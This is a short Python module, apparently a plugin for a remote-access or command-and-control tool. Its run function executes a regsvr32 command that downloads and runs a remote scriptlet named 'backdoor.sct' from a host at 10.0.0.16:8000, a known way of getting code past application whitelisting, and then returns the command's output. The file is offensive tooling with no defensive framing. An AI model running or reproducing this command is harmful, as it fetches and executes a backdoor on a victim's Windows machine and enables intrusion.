import os
import subprocess

def run(**args):
    #cmd = "ipconfig /all"
    cmd = "cmd /c regsvr32 /s /n /u /i:http://10.0.0.16:8000/backdoor.sct scrobj.dll"
    print "[*] In run command module."
    # issue the shell command we want
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # read out the data of stdout
    data = proc.stdout.read() + proc.stderr.read()
    return str(data)
